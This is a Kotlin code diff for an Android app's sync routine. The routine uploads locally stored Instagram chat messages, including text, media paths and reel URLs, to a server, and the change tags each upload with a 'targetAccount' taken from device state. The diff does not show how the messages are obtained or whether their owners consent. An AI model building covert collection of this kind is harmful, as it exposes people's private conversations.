@@ -474,6 +474,7 @@ class SyncRunner(private val context: Context) {
                 chatMessages = db.instagramMessageDao().getMessagesForChat(chatName, cutoffMs = 0L)
             }
 
+            val currentAccount = DeviceState(context).instagramAccount
             // 5. Map to DTOs
             val dtos = chatMessages.map {
                 InstagramMessageEntryDto(
@@ -484,7 +485,8 @@ class SyncRunner(private val context: Context) {
                     messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
                     mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
                     mediaPath = it.mediaPath,
-                    reelUrl = it.reelUrl
+                    reelUrl = it.reelUrl,
+                    targetAccount = it.targetAccount ?: currentAccount
                 )
             }
 
@@ -493,7 +495,8 @@ class SyncRunner(private val context: Context) {
                 bearer,
                 InstagramMessagesSyncRequest(
                     entries = dtos,
-                    activeChat = chatName
+                    activeChat = chatName,
+                    accountName = currentAccount
                 )
             )
 
@@ -906,6 +909,7 @@ class SyncRunner(private val context: Context) {
         val unsynced = db.instagramMessageDao().getUnsynced()
         if (unsynced.isEmpty()) return
 
+        val currentAccount = DeviceState(context).instagramAccount
         val dtos = unsynced.map {
             InstagramMessageEntryDto(
                 chatName = it.chatName,
@@ -915,11 +919,15 @@ class SyncRunner(private val context: Context) {
                 messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
                 mediaType = it.mediaType,
                 mediaPath = it.mediaPath,
-                reelUrl = it.reelUrl
+                reelUrl = it.reelUrl,
+                targetAccount = it.targetAccount ?: currentAccount
             )
         }
         try {
-            val response = ApiClient.service.syncInstagramMessages(bearer, InstagramMessagesSyncRequest(dtos))
+            val response = ApiClient.service.syncInstagramMessages(
+                bearer,
+                InstagramMessagesSyncRequest(dtos, accountName = currentAccount)
+            )
             if (response.isSuccessful) {
                 db.instagramMessageDao().markSynced(unsynced.map { it.id })
                 db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
